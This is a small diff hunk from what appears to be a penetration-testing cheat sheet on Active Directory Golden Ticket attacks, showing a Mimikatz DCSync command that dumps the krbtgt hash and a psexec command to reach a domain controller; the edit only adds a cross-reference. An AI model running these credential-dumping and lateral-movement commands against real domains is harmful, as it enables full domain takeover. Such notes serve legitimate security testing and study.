@@ -192,7 +192,7 @@ Golden -
 lsadump::dcsync /user:ecorp\krbtgt
 ```
 #### Golden
-Jump to DC to dump krbtgt hash -
+Jump to DC to dump krbtgt hash or via DCSync above -
 
 ```psexec.exe \\dc01 cmd.exe```
 
